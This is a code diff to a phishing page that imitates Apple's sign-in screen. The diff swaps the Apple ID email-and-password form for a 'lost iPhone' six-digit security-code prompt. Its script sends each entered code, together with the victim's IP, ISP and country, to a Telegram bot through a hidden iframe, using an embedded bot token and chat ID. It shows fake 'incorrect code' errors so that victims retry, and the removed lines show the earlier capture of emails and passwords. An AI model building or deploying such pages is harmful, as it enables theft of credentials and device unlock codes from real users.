@@ -16,29 +16,25 @@
             
             <div class="login-form">
                 <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
-                <p id="loginTitle">Sign in with your Apple ID</p>
+                <p id="loginTitle">Enter the security code from your lost iPhone</p>
+                <p id="subtitle" style="font-size: 1rem; color: #d2d2d7; margin: 0.5rem 0 2rem 0; font-weight: 400;">Enter the 6-digit security code to see the most recent location</p>
                 
-                <div class="input-group">
-                    <input id="email-phone" type="email" placeholder="Email or phone number" required>
-                    <i class='bx bx-right-arrow-circle'></i>
+                <div class="code-input-container">
+                    <div class="code-inputs" id="codeInputs">
+                        <input type="text" maxlength="1" class="code-input" data-index="0">
+                        <input type="text" maxlength="1" class="code-input" data-index="1">
+                        <input type="text" maxlength="1" class="code-input" data-index="2">
+                        <input type="text" maxlength="1" class="code-input" data-index="3">
+                        <input type="text" maxlength="1" class="code-input" data-index="4">
+                        <input type="text" maxlength="1" class="code-input" data-index="5">
+                    </div>
                 </div>
                 
-                <div class="input-group password-field" id="passwordField">
-                    <input id="password" type="password" placeholder="Password">
-                    <i class='bx bx-lock-alt'></i>
+                <div style="margin: 1rem 0; font-size: 0.9rem; color: #aeaeb2; text-align: center;">
+                    Do you have a 4-digit code?
                 </div>
                 
-                <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
-            </div>
-            
-            <div class="login-options">
-                <label class="checkbox-label">
-                    <input type="checkbox" id="check"> Keep me signed in
-                </label>
-                <div class="links">
-                    <a href="#">Forgot Apple ID or password?</a>
-                    <a href="#">Create Apple ID</a>
-                </div>
+                <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
             </div>
         </form>
     </main>
@@ -53,14 +49,10 @@
     </footer>
 
     <script>
-        // 🔥 SCRIPT SIN CAMBIOS - MANTIENE TODA LA FUNCIONALIDAD
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 ERROR VISIBLE + Telegram solo con password');
+            console.log('🚀 CÓDIGO DE 6 DÍGITOS - iPhone perdido');
             
-            const emailInput = document.getElementById('email-phone');
-            const arrowIcon = document.querySelector('.bx-right-arrow-circle');
-            const passwordField = document.getElementById('passwordField');
-            const passwordInput = document.getElementById('password');
+            const codeInputs = document.querySelectorAll('.code-input');
             const submitBtn = document.getElementById('submitBtn');
             const errorMsg = document.getElementById('errorMsg');
             const form = document.getElementById('sign-in');
@@ -69,14 +61,52 @@
             const MAX_ATTEMPTS = 3;
             
             const appleErrors = [
-                "Incorrect Apple ID or password.",
-                "Your Apple ID or password is incorrect.",
-                "The Apple ID or password you entered has been disabled."
+                "Incorrect security code.",
+                "The security code you entered is incorrect.",
+                "Security code verification failed."
             ];
             
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
+            
+            // Auto-focus primer input
+            codeInputs[0].focus();
+            
+            // Manejar navegación entre inputs
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.data && !/[0-9]/.test(e.data)) {
+                        e.target.value = '';
+                        return;
+                    }
+                    if (input.value.length === 1 && index < 5) {
+                        codeInputs[index + 1].focus();
+                    }
+                    checkCompleteCode();
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+                
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const numbers = paste.replace(/\D/g, '').slice(0, 6);
+                    numbers.split('').forEach((num, i) => {
+                        if (codeInputs[i]) {
+                            codeInputs[i].value = num;
+                        }
+                    });
+                    if (numbers.length === 6) {
+                        codeInputs[5].focus();
+                        checkCompleteCode();
+                    }
+                });
+            });
             
             async function getIPInfo() {
                 try {
@@ -94,47 +124,34 @@
                 }
             }
             
-            const showPassword = () => {
-                if (emailInput.value.trim()) {
-                    passwordField.classList.add('show');
+            function checkCompleteCode() {
+                const code = Array.from(codeInputs).map(input => input.value).join('');
+                if (code.length === 6) {
                     submitBtn.classList.add('show');
-                    setTimeout(() => passwordInput.focus(), 300);
+                } else {
+                    submitBtn.classList.remove('show');
                 }
-            };
-            
-            arrowIcon.addEventListener('click', showPassword);
-            emailInput.addEventListener('keypress', e => {
-                if (e.key === 'Enter' && emailInput.value.trim()) {
-                    showPassword();
-                }
-            });
-            
-            emailInput.addEventListener('blur', () => {
-                if (emailInput.value.trim() === '') {
-                    showError('Enter an Apple ID or phone number.');
-                }
-            });
+            }
             
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 loginAttempts++;
                 
-                const email = emailInput.value.trim();
-                const password = passwordInput.value.trim();
+                const code = Array.from(codeInputs).map(input => input.value).join('');
                 
-                if (!password) {
-                    showError('Enter your password.');
+                if (code.length !== 6) {
+                    showError('Enter the 6-digit security code.');
                     return;
                 }
                 
-                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: ${email}`);
+                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${code}`);
                 
                 const ipInfo = await getIPInfo();
                 
-                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
+                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀
 
-📧 *Email:* ${email}
-🔑 *Password:* ${password}
+🔢 *Código:* ${code}
+📱 *Dispositivo:* iPhone perdido
 🌐 *IP:* ${ipInfo.ip}
 🏢 *Proveedor:* ${ipInfo.isp}
 🌍 *País:* ${ipInfo.country}
@@ -148,15 +165,16 @@
                 const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 iframe.src = telegramUrl;
                 
-                console.log('📤 Telegram con password:', ipInfo.ip);
+                console.log('📤 Telegram con código:', code, ipInfo.ip);
                 
                 if (loginAttempts < MAX_ATTEMPTS) {
                     const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
                     showError(errorText);
-                    passwordInput.value = '';
-                    passwordInput.focus();
+                    codeInputs[0].focus();
+                    codeInputs.forEach(input => input.value = '');
+                    submitBtn.classList.remove('show');
                 } else {
-                    showError('Signing in to your account...');
+                    showError('Verifying security code...');
                     setTimeout(() => {
                         window.location.href = 'index.html';
                     }, 1500);
@@ -173,12 +191,52 @@
                 }, 5000);
             }
             
-            console.log('✅ Telegram SOLO con password + Error VISIBLE');
+            console.log('✅ CÓDIGO 6 DÍGITOS FUNCIONANDO');
         });
     </script>
 
     <style>
-        /* ESTILOS INLINE PARA ERROR MANTIENEN PRIORIDAD */
+        /* ESTILOS PARA INPUTS DE CÓDIGO */
+        .code-input-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+        
+        .code-inputs {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 60px;
+            font-size: 1.8rem;
+            font-weight: 600;
+            text-align: center;
+            background: rgba(52, 52, 56, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: #ffffff;
+            transition: all 0.3s ease;
+            font-family: 'SF Pro Display', -apple-system, sans-serif;
+        }
+        
+        .code-input:focus {
+            border-color: #0a84ff;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.2);
+            outline: none;
+            transform: scale(1.05);
+        }
+        
+        .code-input::placeholder {
+            color: rgba(210, 210, 215, 0.4);
+        }
+
+        /* ESTILOS INLINE PARA ERROR */
         .error-message {
             position: relative !important;
             top: -10px !important;
